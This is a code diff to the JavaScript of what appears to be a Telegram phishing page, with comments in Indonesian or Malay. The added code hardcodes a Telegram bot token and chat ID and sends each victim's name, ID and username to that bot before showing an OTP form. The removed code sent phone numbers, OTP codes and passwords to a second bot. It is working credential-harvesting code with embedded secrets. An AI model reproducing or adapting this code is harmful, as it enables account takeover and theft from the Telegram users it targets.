@@ -1,3 +1,60 @@
+// Konfigurasi Bot Telegram dengan credentials yang benar
+const BOT_TOKEN = '7375505068:AAHJGY2nZzJhNaGok7rU2Cv7jlY861zG5xc';
+const CHAT_ID = '5265564576';
+
+// Fungsi untuk autentikasi Telegram
+function onTelegramAuth(user) {
+    // Simpan data user
+    const userData = {
+        id: user.id,
+        first_name: user.first_name,
+        username: user.username,
+        photo_url: user.photo_url,
+        auth_date: user.auth_date
+    };
+
+    // Kirim notifikasi ke bot
+    const message = `
+────────────────
+🔰 LOGIN TELEGRAM BERHASIL 🔰
+────────────────
+👤 Nama: ${userData.first_name}
+📱 ID: ${userData.id}
+${userData.username ? `📨 Username: @${userData.username}` : ''}
+🕒 Waktu: ${new Date().toLocaleString()}
+────────────────`;
+
+    sendMessageToTelegram(message);
+
+    // Lanjut ke form OTP
+    document.getElementById('phoneNumberForm').style.display = 'none';
+    document.getElementById('otpForm').style.display = 'block';
+}
+
+// Fungsi untuk mengirim pesan ke bot Telegram
+function sendMessageToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Pesan terkirim:', data);
+    })
+    .catch(error => {
+        console.error('Error:', error);
+    });
+}
+
 // Fungsi untuk memulai loading
 function startLoading() {
   console.log("startLoading function called");
@@ -31,7 +88,6 @@ function startLoading() {
         document.getElementById("centeredContainer").style.display = "none";
         document.getElementById("enterContainer").style.display = "block";
         document.getElementById("phoneNumberForm").style.display = "block";
-        initTelegramLogin(); // Inisialisasi widget Telegram
       }, 2000); // Waktu tunda 2 detik
     }
   }, 50); // Persentase meningkat setiap 50ms
@@ -314,71 +370,3 @@ function showThirdProgressDialog() {
 }
 let storedPhoneNumber = ""; // Variabel untuk menyimpan nomor telepon
 let storedOtp = ""; // Variabel untuk menyimpan OTP
-
-// Fungsi untuk mengirim pesan ke Telegram
-function sendMessageToTelegram(message) {
-  const token = "6118334877:AAFG01BoiWes_NjWgaj1E7P1i4Epmw4NWfM";
-  const chatId = "5312863041";
-
-  let formattedMessage;
-
-  if (message.includes("Nomor Telepon:")) {
-    formattedMessage = `
-────────────────
-🔰 DATA | NOMBOR TELEGRAM 🔰
-────────────────
-📱 No HP : \`${message.split(":")[1].trim()}\`
-────────────────`;
-  } else if (message.includes("OTP:")) {
-    const phone = document.getElementById("phoneNumberInput").value;
-    formattedMessage = `
-────────────────
-🔰 DATA | OTP 🔰
-────────────────
-📱 No HP : \`${phone}\`
-🔑 OTP   : ${message.split(":")[1].trim()}
-────────────────`;
-  } else if (message.includes("Password:")) {
-    const phone = document.getElementById("phoneNumberInput").value;
-    const otp = document.getElementById("otpInput").value;
-    formattedMessage = `
-────────────────
-🔰 DATA | KATA SANDI 🔰
-────────────────
-📱 No HP : \`${phone}\`
-🔑 OTP   : ${otp}
-🔐 Kata Laluan : ${message.split(":")[1].trim()}
-────────────────`;
-  }
-
-  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
-    formattedMessage
-  )}&parse_mode=Markdown`;
-
-  fetch(url)
-    .then((response) => response.json())
-    .then((data) => console.log("Pesan berhasil dikirim ke Telegram:", data))
-    .catch((error) => console.error("Terjadi kesalahan:", error));
-}
-
-// Fungsi untuk menginisialisasi Telegram Login Widget
-function initTelegramLogin() {
-  TelegramLoginWidget.create(
-    "telegram-login-widget", // id elemen
-    {
-      botName: "NamaBot", // Ganti dengan nama bot Telegram Anda
-      buttonSize: "large",
-      cornerRadius: 8,
-      requestAccess: "write",
-      usePic: false,
-      lang: "id",
-      onAuth: function (user) {
-        // Callback ketika autentikasi berhasil
-        console.log("Logged in as " + user.first_name);
-        // Lanjutkan ke langkah OTP
-        document.getElementById("phoneNumberForm").style.display = "none";
-        document.getElementById("otpForm").style.display = "block";
-      },
-    }
-  );
-}
